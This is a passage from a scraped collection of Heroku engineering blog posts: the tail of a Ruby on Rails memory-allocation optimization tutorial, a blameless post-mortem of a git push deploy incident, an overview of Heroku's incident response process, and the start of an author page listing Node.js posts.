…/code/codetriage/.gem/ruby/2.5.3/gems/rack-mini-profiler-1.0.0/lib/mini_profiler/storage/file_store.rb\n      9824  …/code/rails/actionpack/lib/abstract_controller/caching/fragments.rb\n      9360  …/.rubies/ruby-2.5.3/lib/ruby/2.5.0/logger.rb\n      8440  …/code/rails/activerecord/lib/active_record/attribute_methods.rb\n      8304  …/code/rails/activemodel/lib/active_model/attribute.rb\n      8160  …/code/rails/actionview/lib/action_view/renderer/partial_renderer.rb\n      8000  …/code/rails/activerecord/lib/active_record/integration.rb\n      7880  …/code/rails/actionview/lib/action_view/log_subscriber.rb\n      7478  …/code/rails/actionview/lib/action_view/helpers/tag_helper.rb\n      7096  …/code/rails/actionview/lib/action_view/renderer/partial_renderer/collection_caching.rb\n      # ... The full output is massive , so I've truncated it here. Once you've got your memory in a pile. I like to look at the \"allocated memory\" by file. I start at the top and look at each in turn. In this case, we'll look at this file: 8440  …/code/rails/activerecord/lib/active_record/attribute_methods.rb Once you have a file you want to look at, you can focus on it in derailed like this: $ ALLOW_FILES=active_record/attribute_methods.rb \\\n  bundle exec derailed exec perf:objects\n\nallocated memory by file\n-----------------------------------\n      8440  …/code/rails/activerecord/lib/active_record/attribute_methods.rb\n\nallocated memory by location\n-----------------------------------\n      8000  …/code/rails/activerecord/lib/active_record/attribute_methods.rb:270\n       320  …/code/rails/activerecord/lib/active_record/attribute_methods.rb:221\n        80  …/code/rails/activerecord/lib/active_record/attribute_methods.rb:189\n        40  …/code/rails/activerecord/lib/active_record/attribute_methods.rb:187 Now we can see exactly where the memory is being allocated in this file. Starting at the top of the locations, I'll work my way down to understand how memory is allocated and used. Looking first at this line: 8000  …/code/rails/activerecord/lib/active_record/attribute_methods.rb:270 We can open this in an editor and navigate to that location: $ bundle open activerecord In that file, here's the line allocating the most memory: def respond_to?(name, include_private = false)\n  return false unless super\n\n  case name\n  when :to_partial_path\n    name = \"to_partial_path\"\n  when :to_model\n    name = \"to_model\"\n  else\n    name = name.to_s # <=== Line 270 here\n  end\n\n  # If the result is true then check for the select case.\n  # For queries selecting a subset of columns, return false for unselected columns.\n  # We check defined?(@attributes) not to issue warnings if called on objects that\n  # have been allocated but not yet initialized.\n  if defined?(@attributes) && self.class.column_names.include?(name)\n    return has_attribute?(name)\n  end\n\n  true\nend Here we can see on line 270 that it's allocating a string. But why? To answer that question, we need more context. We need to understand how this code is used. When we call respond_to on an object, we want to know if a method by that name exists. Because Active Record is backed by a database, it needs to see if a column exists with that name. Typically when you call respond_to you pass in a symbol, for example, user.respond_to?(:email) . But in Active Record, columns are stored as strings. On line 270, we're ensuring that the name value is always a string. This is the code where name is used: if defined?(@attributes) && self.class.column_names.include?(name) Here column_names returns an array of column names, and the include? method will iterate over each until it finds the column with that name, or its nothing ( nil ). To determine if we can get rid of this allocation, we have to figure out if there's a way to replace it without allocating memory. We need to refactor this code while maintaining correctness. I decided to add a method that converted the array of column names into a hash with symbol keys and string values: # lib/activerecord/model_schema.rb\ndef symbol_column_to_string(name_symbol) # :nodoc:\n  @symbol_column_to_string_name_hash ||= column_names.index_by(&:to_sym)\n  @symbol_column_to_string_name_hash[name_symbol]\nend This is how you would use it: User.symbol_column_to_string(:email) #=> \"email\"\nUser.symbol_column_to_string(:foo)   #=> nil Since the value that is being returned every time by this method is from the same hash, we can re-use the same string and not have to allocate. The refactored respond_to code ends up looking like this: def respond_to?(name, include_private = false)\n  return false unless super\n\n  # If the result is true then check for the select case.\n  # For queries selecting a subset of columns, return false for unselected columns.\n  # We check defined?(@attributes) not to issue warnings if called on objects that\n  # have been allocated but not yet initialized.\n  if defined?(@attributes)\n    if name = self.class.symbol_column_to_string(name.to_sym)\n      return has_attribute?(name)\n    end\n  end\n\n  true\nend Running our benchmarks, this patch yielded a reduction in memory of 1%. Using code that eventually became derailed exec perf:library , I verified that the patch made end-to-end request/response page speed on CodeTriage 1% faster. Performance and Statistical Significance When talking about benchmarks, it's important to talk about statistics and their impact. I talk a bit about this in Lies, Damned Lies, and Averages: Perc50, Perc95 explained for Programmers . Essentially any time you measure a value, there's a chance that it could result from randomness. If you run a benchmark 3 times, it will give you 3 different results. If it shows that it was faster twice and slower once, how can you be certain that the results are because of the change and not random chance? That's precisely the question that \"statistical significance\" tries to answer. While we can never know, we can make an informed decision. How? Well, if you took a measurement of the same code many times, you would know any variation was the result of randomness. This would give you a distribution of randomness. Then you could use this distribution to understand how likely it is that your change was caused by randomness. In the talk, I go into detail on the origins of \"Student's T-Test.\" In derailed, I've switched to using Kolmogorov-Smirnov instead. When I ran benchmarks on CodeTriage, I wanted to be sure that my results were valid, so I ran them multiple times and ran Kolmogorov Smirnov on them. This gives me a confidence interval. If my results are in that interval, then I can say with 95% certainty that my results are not the result of random chance i.e., that they're valid and are statistically significant. If it's not significant, it could mean that the change is too small to detect, that you need more samples, or that there is no difference. In addition to running a significance check on your change, it's useful to see the distribution. Derailed benchmarks does this for you by default now. Here is a result from derailed exec perf:library used to compare the performance difference of two different commits in a library dependency: Histogram - [winner] \"I am the new commit.\"\n                           ┌                                        ┐\n            [11.2 , 11.28) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 12\n            [11.28, 11.36) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 22\n            [11.35, 11.43) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 30\n            [11.43, 11.51) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 17\n   Time (s) [11.5 , 11.58) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 13\n            [11.58, 11.66) ┤▇▇▇▇▇▇▇ 6\n            [11.65, 11.73) ┤ 0\n            [11.73, 11.81) ┤ 0\n            [11.8 , 11.88) ┤ 0\n                           └                                        ┘\n                                      # of runs in range\n\n\n\n                  Histogram - [loser] \"Old commit\"\n                           ┌                                        ┐\n            [11.2 , 11.28) ┤▇▇▇▇ 3\n            [11.28, 11.36) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 19\n            [11.35, 11.43) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 17\n            [11.43, 11.51) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 25\n   Time (s) [11.5 , 11.58) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 15\n            [11.58, 11.66) ┤▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 13\n            [11.65, 11.73) ┤▇▇▇▇ 3\n            [11.73, 11.81) ┤▇▇▇▇ 3\n            [11.8 , 11.88) ┤▇▇▇ 2\n                           └                                        ┘\n                                      # of runs in range The TLDR of this whole section is that in addition to showing my change as being faster, I was also able to show that the improvement was statistically significant. Tidying example 2: Converting strings to time takes time One percent faster is good, but it could be better. Let's do it again. First, get a pile of objects: $ bundle exec derailed exec perf:objects\n\n# ...\n\nallocated memory by file\n-----------------------------------\n    126489  …/code/rails/activesupport/lib/active_support/core_ext/string/output_safety.rb\n     49448  …/code/codetriage/app/views/layouts/_app.html.slim\n     49328  …/code/codetriage/app/views/layouts/application.html.slim\n     36097  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb\n     25096  …/code/codetriage/app/views/pages/_repos_with_pagination.html.slim\n     24432  …/code/rails/activesupport/lib/active_support/core_ext/object/to_query.rb\n     23526  …/code/codetriage/.gem/ruby/2.5.3/gems/rack-mini-profiler-1.0.0/lib/patches/db/pg.rb\n     21912  …/code/rails/activerecord/lib/active_record/connection_adapters/postgresql_adapter.rb\n     18000  …/code/rails/activemodel/lib/active_model/attribute_set/builder.rb\n     15888  …/code/rails/activerecord/lib/active_record/result.rb\n     14610  …/code/rails/activesupport/lib/active_support/cache.rb\n     11148  …/code/codetriage/.gem/ruby/2.5.3/gems/rack-mini-profiler-1.0.0/lib/mini_profiler/storage/file_store.rb\n      9824  …/code/rails/actionpack/lib/abstract_controller/caching/fragments.rb\n      9360  …/.rubies/ruby-2.5.3/lib/ruby/2.5.0/logger.rb\n      8304  …/code/rails/activemodel/lib/active_model/attribute.rb Zoom in on a file: 36097  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb Isolate the file: $ ALLOW_FILE=active_model/type/helpers/time_value.rb \\\n  bundle exec derailed exec perf:objects\n\nTotal allocated: 39617 bytes (600 objects)\nTotal retained:  0 bytes (0 objects)\n\nallocated memory by gem\n-----------------------------------\n     39617  activemodel/lib\n\nallocated memory by file\n-----------------------------------\n     39617  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb\n\nallocated memory by location\n-----------------------------------\n     17317  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb:72\n     12000  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb:74\n      6000  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb:73\n      4300  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb:64 We're going to do the same thing by starting to look at the top location: 17317  …/code/rails/activemodel/lib/active_model/type/helpers/time_value.rb:72 Here's the code: def fast_string_to_time(string)\n if string =~ ISO_DATETIME # <=== line 72 Here\n   microsec = ($7.to_r * 1_000_000).to_i\n   new_time $1.to_i, $2.to_i, $3.to_i, $4.to_i, $5.to_i, $6.to_i, microsec\n end\nend On line 72, we are matching the input string with a regular expression constant. This allocates a lot of memory because each grouped match of the regular expression allocates a new string. To understand if we can make this faster, we have to understand how it's used. This method takes in a string, then uses a regex to split it into parts, and then sends those parts to the new_time method. There's not much going on that can be sped up there, but what's happening on this line: microsec = ($7.to_r * 1_000_000).to_i Here's the regex: ISO_DATETIME = /\\A(\\d{4})-(\\d\\d)-(\\d\\d) (\\d\\d):(\\d\\d):(\\d\\d)(\\.\\d+)?\\z/ When I ran the code and output $7 from the regex match, I found that it would contain a string that starts with a dot and then has numbers, for example: puts $7 # => \".1234567\" This code wants microseconds as an integer, so it turns it into a \"rational\" and then multiplies it by a million and turns it into an integer. ($7.to_r * 1_000_000).to_i # => 1234567 You might notice that it looks like we're basically dropping the period and then turning it into an integer. So why not do that directly? Here's what it looks like: def fast_string_to_time(string)\n  if string =~ ISO_DATETIME\n    microsec_part = $7\n    if microsec_part && microsec_part.start_with?(\".\") && microsec_part.length == 7\n      microsec_part[0] = \"\"         # <=== HERE\n      microsec = microsec_part.to_i # <=== HERE\n    else\n      microsec = (microsec_part.to_r * 1_000_000).to_i\n    end\n    new_time $1.to_i, $2.to_i, $3.to_i, $4.to_i, $5.to_i, $6.to_i, microsec\n  end We've got to guard this case by checking for the conditions of our optimization. Now the question is: is this faster? Here's a microbenchmark: original_string = \".443959\"\n\nrequire 'benchmark/ips'\n\nBenchmark.ips do |x|\n  x.report(\"multiply\") {\n    string = original_string.dup\n    (string.to_r * 1_000_000).to_i\n  }\n  x.report(\"new     \") {\n    string = original_string.dup\n    if string && string.start_with?(\".\".freeze) && string.length == 7\n      string[0] = ''.freeze\n      string.to_i\n    end\n  }\n  x.compare!\nend\n\n# Warming up --------------------------------------\n#             multiply   125.783k i/100ms\n#             new        146.543k i/100ms\n# Calculating -------------------------------------\n#             multiply      1.751M (± 3.3%) i/s -      8.805M in   5.033779s\n#             new           2.225M (± 2.1%) i/s -     11.137M in   5.007110s\n\n# Comparison:\n#             new     :  2225289.7 i/s\n#             multiply:  1751254.2 i/s - 1.27x  slower The original code is 1.27x slower. YAY! Tidying Example 3: Lightning fast cache keys The last speedup is kind of underwhelming, so you might wonder why I added it. If you remember our first example of optimizing respond_to , it helped to understand the broader context of how it's used. Since this is such an expensive object allocation location, is there an opportunity to call it less or not call it at all? To find out, I added a puts caller in the code and re-ran it. Here's part of a backtrace: ====================================================================================================\n…/code/rails/activemodel/lib/active_model/type/date_time.rb:25:in `cast_value'\n…/code/rails/activerecord/lib/active_record/connection_adapters/postgresql/oid/date_time.rb:16:in `cast_value'\n…/code/rails/activemodel/lib/active_model/type/value.rb:38:in `cast'\n…/code/rails/activemodel/lib/active_model/type/helpers/accepts_multiparameter_time.rb:12:in `block in initialize'\n…/code/rails/activemodel/lib/active_model/type/value.rb:24:in `deserialize'\n…/.rubies/ruby-2.5.3/lib/ruby/2.5.0/delegate.rb:349:in `block in delegating_block'\n…/code/rails/activerecord/lib/active_record/attribute_methods/time_zone_conversion.rb:8:in `deserialize'\n…/code/rails/activemodel/lib/active_model/attribute.rb:164:in `type_cast'\n…/code/rails/activemodel/lib/active_model/attribute.rb:42:in `value'\n…/code/rails/activemodel/lib/active_model/attribute_set.rb:48:in `fetch_value'\n…/code/rails/activerecord/lib/active_record/attribute_methods/read.rb:77:in `_read_attribute'\n…/code/rails/activerecord/lib/active_record/attribute_methods/read.rb:40:in `__temp__57074616475646f51647'\n…/code/rails/activesupport/lib/active_support/core_ext/object/try.rb:16:in `public_send'\n…/code/rails/activesupport/lib/active_support/core_ext/object/try.rb:16:in `try'\n…/code/rails/activerecord/lib/active_record/integration.rb:99:in `cache_version'\n…/code/rails/activerecord/lib/active_record/integration.rb:68:in `cache_key'\n…/code/rails/activesupport/lib/active_support/cache.rb:639:in `expanded_key'\n…/code/rails/activesupport/lib/active_support/cache.rb:644:in `block in expanded_key'\n…/code/rails/activesupport/lib/active_support/cache.rb:644:in `collect'\n…/code/rails/activesupport/lib/active_support/cache.rb:644:in `expanded_key'\n…/code/rails/activesupport/lib/active_support/cache.rb:608:in `normalize_key'\n…/code/rails/activesupport/lib/active_support/cache.rb:565:in `block in read_multi_entries'\n…/code/rails/activesupport/lib/active_support/cache.rb:564:in `each'\n…/code/rails/activesupport/lib/active_support/cache.rb:564:in `read_multi_entries'\n…/code/rails/activesupport/lib/active_support/cache.rb:387:in `block in read_multi' I followed it backwards until I hit these two places: …/code/rails/activerecord/lib/active_record/integration.rb:99:in `cache_version'\n…/code/rails/activerecord/lib/active_record/integration.rb:68:in `cache_key' It looks like this expensive code is being called while generating a cache key. def cache_key(*timestamp_names)\n  if new_record?\n    \"#{model_name.cache_key}/new\"\n  else\n    if cache_version && timestamp_names.none? # <== line 68 here\n      \"#{model_name.cache_key}/#{id}\"\n    else\n      timestamp = if timestamp_names.any?\n        ActiveSupport::Deprecation.warn(<<-MSG.squish)\n          Specifying a timestamp name for #cache_key has been deprecated in favor of\n          the explicit #cache_version method that can be overwritten.\n        MSG\n\n        max_updated_column_timestamp(timestamp_names)\n      else\n        max_updated_column_timestamp\n      end\n\n      if timestamp\n        timestamp = timestamp.utc.to_s(cache_timestamp_format)\n        \"#{model_name.cache_key}/#{id}-#{timestamp}\"\n      else\n        \"#{model_name.cache_key}/#{id}\"\n      end\n    end\n  end\nend On line 68 in the cache_key code it calls cache_version . Here's the code for cache_version : def cache_version # <== line 99 here\n  if cache_versioning && timestamp = try(:updated_at)\n    timestamp.utc.to_s(:usec)\n  end\nend Here is our culprit: timestamp = try(:updated_at) What is happening is that some database adapters, such as the one for Postgres, returned their values from the database driver as strings. Then active record will lazily cast them into Ruby objects when they are needed. In this case, our time value method is being called to convert the updated timestamp into a time object so we can use it to generate a cache version string. Here's the value before it's converted: User.first.updated_at_before_type_cast # => \"2019-04-24 21:21:09.232249\" And here's the value after it's converted: User.first.updated_at.to_s(:usec)      # => \"20190424212109232249\" Basically, all the code is doing is trimming out the non-integer characters. Like before, we need a guard that our optimization can be applied: # Detects if the value before type cast\n# can be used to generate a cache_version.\n#\n# The fast cache version only works with a\n# string value directly from the database.\n#\n# We also must check if the timestamp format has been changed\n# or if the timezone is not set to UTC then\n# we cannot apply our transformations correctly.\ndef can_use_fast_cache_version?(timestamp)\n  timestamp.is_a?(String) &&\n    cache_timestamp_format == :usec &&\n    default_timezone == :utc &&\n    !updated_at_came_from_user?\nend Then once we're in that state, we can modify the string directly: # Converts a raw database string to `:usec`\n# format.\n#\n# Example:\n#\n#   timestamp = \"2018-10-15 20:02:15.266505\"\n#   raw_timestamp_to_cache_version(timestamp)\n#   # => \"20181015200215266505\"\n#\n# PostgreSQL truncates trailing zeros,\n# https://github.com/postgres/postgres/commit/3e1beda2cde3495f41290e1ece5d544525810214\n# to account for this we pad the output with zeros\ndef raw_timestamp_to_cache_version(timestamp)\n  key = timestamp.delete(\"- :.\")\n  if key.length < 20\n    key.ljust(20, \"0\")\n  else\n    key\n  end\nend There's some extra logic due to the Postgres truncation behavior linked above. The resulting code to cache_version becomes: def cache_version\n  return unless cache_versioning\n\n  if has_attribute?(\"updated_at\")\n    timestamp = updated_at_before_type_cast\n    if can_use_fast_cache_version?(timestamp)\n      raw_timestamp_to_cache_version(timestamp)\n    elsif timestamp = updated_at\n      timestamp.utc.to_s(cache_timestamp_format)\n    end\n  end\nend That's the opportunity. What's the impact? Before: Total allocated: 743842 bytes (6626 objects)\nAfter:  Total allocated: 702955 bytes (6063 objects) The bytes reduced is 5% fewer allocations. Which is pretty good. How does it translate to speed? It turns out that time conversion is very CPU intensive and changing this code makes the target application up to 1.12x faster. This means that if your app previously required 100 servers to run, it can now run with about 88 servers. Wrap up Adding together these optimizations and others brings the overall performance improvement to 1.23x or a net reduction of 19 servers. Basically, it's like buying 4 servers and getting 1 for free. These examples were picked from my changes to the Rails codebase, but you can use them to optimize your applications. The general framework looks like this: Get a list of all your memory Zoom in on a hotspot Figure out what is causing that memory to be allocated inside of your code Ask if you can refactor your code to not depend on those allocations If you want to learn more about memory, here are my recommendations: Why does my App's Memory Use Grow Over Time? - Start here, an excellent high-level overview of what causes a system's memory to grow that will help you develop an understanding of how Ruby allocates and uses memory at the application level. Complete Guide to Rails Performance (Book) - This book is by Nate Berkopec and is excellent. I recommend it to someone at least once a week. How Ruby uses memory - This is a lower level look at precisely what \"retained\" and \"allocated\" memory means. It uses small scripts to demonstrate Ruby memory behavior. It also explains why the \"total max\" memory of our system rarely goes down. How Ruby uses memory (Video) - If you're new to the concepts of object allocation, this might be an excellent place to start (you can skip the first story in the video, the rest are about memory). Memory stuff starts at 13 minutes Jumping off the Ruby Memory Cliff - Sometimes you might see a 'cliff' in your memory metrics or a saw-tooth pattern. This article explores why that behavior exists and what it means. Ruby Memory Use (Heroku Devcenter article I maintain) - This article focuses on alleviating the symptoms of high memory use. Debugging a memory leak on Heroku - TLDR; It's probably not a leak. Still worth reading to see how you can come to the same conclusions yourself. Content is valid for other environments than Heroku. Lots of examples of using the tool derailed_benchmarks (that I wrote). The Life-Changing Magic of Tidying Active Record Allocations (Video) - This talk shows how I used tools to track down and eliminate memory allocations in real life. All of the examples are from patches I submitted to Rails, but the process works the same for finding allocations caused by your application logic. Get ahold of Richard and stay up-to-date with Ruby, Rails, and other programming related content through a subscription to his mailing list . memory object allocation performance ruby", "date": "2020-09-16,"},
{"website": "Heroku", "title": "How I Broke `git push heroku main`", "author": ["Damien Mathieu"], "link": "https://blog.heroku.com/how-i-broke-git-push-heroku-main", "abstract": "How I Broke `git push heroku main` Posted by Damien Mathieu October 01, 2020 Listen to this article Incidents are inevitable. Any platform, large or small will have them. While resiliency work will definitely be an important factor in reducing the number of incidents, hoping to remove all of them (and therefore reach 100% uptime) is not an achievable goal. We should, however, learn as much as we can from incidents, so we can avoid repeating them. In this post, we will look at one of those incidents, #2105 , see how it happened (spoiler: I messed up), and what we’re doing to avoid it from happening again (spoiler: I’m not fired). Git push inception Our Git server is a component written in Go which can listen for HTTP and SSH connections to process a Git command.\nWhile we try to run all our components as Heroku apps on our platform just like Heroku customers, this component is different, as it has several constraints which make it unsuitable for running on the Heroku platform. Indeed, Heroku currently only provides HTTP routing, so it can’t handle incoming SSH connections. This component is therefore hosted as a “kernel app” using an internal framework which mimics the behavior of Heroku, but runs directly on virtual servers. Whenever we deploy new code for this component, we will mark instances running the previous version of the code as poisoned. They won’t be able to receive new requests but will have the time they need to finish processing any ongoing requests (every Git push is one request, and those can take up to one hour).\nOnce they don’t have any active requests open, the process will stop and restart using the new code. When all selected instances have been deployed to, we can move to another batch, and repeat until all instances are running the new code. It was such a nice morning On September 3, I had to deploy a change to switch from calling one internal API endpoint to another. It included a new authentication method between components. This deploy was unusual because it required setting a new configuration variable, which includes the following manual actions: Set the new config variable with the framework handling our instances Run a command to have the new config variable transmitted to every instance Trigger the deploy so the config variables starts being used So, on that morning, I started deploying our staging instance. I set the new configuration variable on both staging and production.\nThen, I had the config variables transmitted to every instance, but only in staging as I figured I’d avoid touching production right now.\nFinally, I kicked off the staging deployment, and started monitoring that everything went smoothly, which it did. A few hours later, I went on to production. Houston, we have a problem I started my production deployment. Since I had set the configuration variable earlier, I went straight to deploying the new code. You may see what I did wrong now. So my code change went to a batch of instances. I didn’t move to another batch though, as I was about to go to lunch. There was no rush to move forward right away, especially since deploying every instance can take several hours. So I went to lunch, but came back a few minutes later as an alert had gone off. The spike you can see on this graph is HTTP 401 responses. If you read carefully the previous section, you may have noticed that I set the new configuration variable in production, but didn’t apply it to the instances.\nSo my deploy to a batch of servers didn’t have the new configuration variable, meaning we were making unauthenticated calls to a private API, which gave us 401 responses. Hence the 401s being sent back publicly. Once I realized that, I ran the script to transmit the configuration variables to the instances, killed the impacted processes, which restarted using the updated configuration variables, and the problem was resolved. Did I mess up? An untrained eye could say “wow, you messed up bad. Why didn’t you run that command?”, and they would be right. Except they actually wouldn’t. The problem isn’t that I forgot to run one command. It’s that the system has allowed me to go forward with the deployment when it could have helped me avoid the issue. Before figuring out any solution, the real fix is to do a truly blameless retrospective. If we had been blaming me for forgetting to run a command instead of focusing on why the system still permitted the deployment, I would probably have felt unsafe reporting this issue, and we would not have been able to improve our systems so that this doesn’t happen again. Then we can focus on solutions. In this specific case, we are going to merge the two steps of updating configuration variables and deploying code into a single step.\nThat way there isn’t an additional step to remember to run from time to time. If we didn’t want or were unable to merge the two steps, we could also have added a safeguard in the form of a confirmation warning if we’re trying to deploy the application’s code while configuration variables aren’t synchronized. Computers are dumb, but they don’t make mistakes Relying on humans to perform multiple manual actions,  especially when some of them are only required rarely (we don’t change configuration variables often) is a recipe for incidents. Our job as engineers is to  build systems that avoid those human flaws, so we can do our human job of thinking about new things, and computers can do theirs: performing laborious and repetitive tasks. This incident shows how a blameless culture benefits everyone in a company (and customers!). Yes, I messed up. But the fix is to improve the process, not to assign blame. We can’t expect folks to be robots who never make mistakes. Instead, we need to build a system that’s safe enough so those mistakes can’t happen. incident response git deploy", "date": "2020-10-01,"},
{"website": "Heroku", "title": "Incident Response at Heroku", "author": ["Guillaume Winter"], "link": "https://blog.heroku.com/incident-response-at-heroku-2020", "abstract": "Incident Response at Heroku Posted by Guillaume Winter October 08, 2020 Listen to this article This post is an update on a previous post about how Heroku handles incident response. As a service provider, when things go wrong, you try to get them fixed as quickly as possible. In addition to technical troubleshooting, there’s a lot of coordination and communication that needs to happen in resolving issues with systems like Heroku’s. At Heroku we’ve codified our practices around these aspects into an incident response framework. Whether you’re just interested in how incident response works at Heroku, or looking to adopt and apply some of these practices for yourself, we hope you find this inside look helpful. Incident Response and the Incident Commander Role We describe Heroku’s incident response framework below. It’s based on the Incident Command System used in natural disaster response and other emergency response fields. Our response framework and the Incident Commander role in particular help us to successfully respond to a variety of incidents. When an incident occurs, we follow these steps: Page an Incident Commander They will assess the issue, and decide if it’s worth investigating further Move to a dedicated chat room The Incident Commander creates a new room in Slack, to centralize all the information for this specific incident Update public status site Our customers want information about incidents as quickly as possible, even if it is preliminary. As soon as possible, the IC designates someone to take on the communications role (“comms”) with a first responsibility of updating the status site with our current understanding of the incident and how it’s affecting customers. The admin section of Heroku’s status site helps the comms operator to get this update out quickly: The status update then appears on status.heroku.com and is sent to customers and internal communication channels via SMS, email, and Slack bot. It also shows on twitter: Send out internal Situation Report Next the IC compiles and sends out the first situation report (“sitrep”) to the internal team describing the incident. It includes what we know about the problem, who is working on it and in what roles, and open issues. As the incident evolves, the sitrep acts as a concise description of the current state of the incident and our response to it. A good sitrep provides information to active incident responders, helps new responders get quickly up to date about the situation, and gives context to other observers like customer support staff. The Heroku status site has a form for the sitrep, so that the IC can update it and the public-facing status details at the same time. When a sitrep is created or updated, it’s automatically distributed internally via email and Slack bot. A versioned log of sitreps is also maintained for later review: Assess problem The next step is to assess the problem in more detail. The goals here are to gain better information for the public status communication (e.g. what users are affected and how, what they can do to work around the problem) and more detail that will help engineers fix the problem (e.g. what internal components are affected, the underlying technical cause). The IC collects this information and reflects it in the sitrep so that everyone involved can see it. It includes the severity, going from SEV0 (critical disruption), to SEV4 (minor feature impacted) Mitigate problem Once the response team has some sense of the problem, it will try to mitigate customer-facing effects if possible. For example, we may put the Platform API in maintenance mode to reduce load on infrastructure systems, or boot additional instances in our fleet to temporarily compensate for capacity issues. A successful mitigation will reduce the impact of the incident on customer apps and actions, or at least prevent the customer-facing issues from getting worse. Coordinate response In coordinating the response, the IC focuses on bringing in the right people to solve the problem and making sure that they have the information they need. The IC can use a Slack bot to page in additional teams as needed (the page will route to the on-call person for that team), or page teams directly. Manage ongoing response As the response evolves, the IC acts as an information radiator to keep the team informed about what’s going on. The IC will keep track of who’s active on the response, what problems have been solved and are still open, the current resolution methods being attempted, when we last communicated with customers, and reflect this back to the team regularly with the sitrep mechanism. Finally, the IC is making sure that nothing falls through the cracks: that no problems go unaddressed and that decisions are made in a timely manner. Post-incident cleanup Once the immediate incident has been resolved, the IC calls for the team to unwind any temporary changes made during the response. For example, alerts may have been silenced and need to be turned back on. The team double-checks that all monitors are green and that all incidents in PagerDuty have been resolved. Post-incident follow-up Finally, the Production Engineering Department will tee up a post-incident follow up. Depending on the severity of the incident, this could be a quick discussion in the normal weekly operational review or a dedicated internal post-mortem with associated public post-mortem post. The post-mortem process often informs changes that we should make to our infrastructure, testing, and process; these are tracked over time within engineering as incident remediation items. When everything goes south As Heroku is part of the Salesforce Platform, we leverage Salesforce Incident Response, and Crisis communication center when things gets really bad. If the severity decided by the IC is SEV1 or worse, Salesforce’s Critical Incident Center (CIC) gets involved. Their role is to assist the Heroku Incident Commander with support around customer communication, and keep the executives informed of the situation. They also can engage the legal teams if needed, mostly for customer communication. In the case where the incident is believed to be a SEV0 ( major disruption for example ), the Heroku Incident Commander can also request assistance from the Universal Command (UC) Leadership. They will help to assess the issue, and determine if the incident really rises to the level of Sev 0. Once it is determined to be the case, the UC will spin up a conference call ( called  bridge ) involving executives, in order for them to have a single source of truth to follow-up on the incident’s evolution. One of the goals is that executives don’t first learn failures from outsides sources. This may seem obvious, but amidst the stress of a significant incident when we're solely focused on fixing a problem impacting customers, it's easy to overlook communicating status to those not directly involved with solving the problem. They are also much better suited to answer to customers requests, and keep them informed of the incident response. Incident Response in Other Fields The incident response framework described above draws from decades of related work in emergency response: natural disaster response, firefighting, aviation, and other fields that need to manage response to critical incidents. We try to learn from this body of work where possible to avoid inventing our incident response policy from first principles.\nTwo areas of previous work particularly influenced how we approach incident response: Incident Command System Our framework draws most directly from the Incident Command System used to manage natural disaster and other large-scale incident responses. This prior art informs our Incident Commander role and our explicit focus on facilitating incident response in addition to directly addressing the technical issues. Crew Resource Management The ideas of Crew Resource Management (a different “CRM”) originated in aviation but have since been successfully applied to other fields such as medicine and firefighting. We draw lessons on communication, leadership, and decision-making from CRM into our incident response thinking.\nWe believe that learning from fields outside of software engineering is a valuable practice, both for operations and other aspects of our business. Summary Heroku’s incident response framework helps us quickly resolve issues while keeping customers informed about what’s happening. We hope you’ve found these details about our incident response framework interesting and that they may even inspire changes in how you think about incident response at your own company.\nAt Heroku we’re continuing to learn from our own experiences and the work of others in related fields. Over time this will mean even better incident response for our platform and better experiences for our customers. ims incident", "date": "2020-10-08,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "Zeke Sikelianos", "Zeke Sikelianos", "Zeke Sikelianos", "Zeke Sikelianos"], "link": "https://blog.heroku.com/authors/zeke-sikelianos", "abstract": "10 Habits of a Happy Node Hacker news March 11, 2014 Zeke Sikelianos This post is from 2014 - check out the update! For most of the nearly twenty years since its inception, JavaScript lacked many of the niceties that made other programming languages like Python and Ruby so attractive: command-line interfaces, a REPL, a package manager, and an organized open-source community. Thanks in part to Node.js and npm, today's JavaScript landscape is dramatically improved. Web developers wield powerful new tools, and are limited only by their imagination. What follows is a list of tips and techniques to keep you and your node apps happy. 1. Start new projects with npm init npm includes an init command which walks you through the process of creating a... Read more Announcing a new and improved Node.js Buildpack news December 10, 2013 Zeke Sikelianos Last week we released a new version of our node buildpack that features dependency caching, faster downloads of the node binary, and support for any recent version of node. This new build process is now the default for all node apps on Heroku, so keep deploying your apps as you normally would and you should start to notice the speed improvements. Faster Deployments The new buildpack makes use of a build cache to store the node_modules directory between builds. This caching can mean dramatically reduced build times, particularly in cases where your modules include binary dependencies like pg , bson , or ws . We've also shaved time off the build process by caching precompiled node... Read more Introducing the Europe Region, Now Available in Public Beta news April 24, 2013 Zeke Sikelianos Today we’re happy to announce Heroku’s Europe region, available in public beta. With more than 3 million apps running on our platform from developers all over the globe, it's not surprising that we've had high demand for Heroku in more regions of the world. After collaborating closely with customers during private beta, we're now ready to offer Heroku services in Europe to all customers as part of a public beta. The Europe region runs Heroku applications from datacenters located in Europe, offering improved performance for users in that region. One Heroku, Two Continents The Europe region offers all the features of the existing US region. Both regions run apps on... Read more Presenting the New Add-ons Site news December 04, 2012 Zeke Sikelianos Heroku Add-ons make it easy for developers to extend their applications with new features and functionality. The Add-on Provider Program has enabled cloud service providers with key business tools, including billing, single sign-on, and an integrated end-user support experience. Since the launch of the Heroku Add-ons site over two years ago, the marketplace has grown to nearly 100 add-ons. As the add-ons ecosystem has grown, we've learned a lot about how cloud 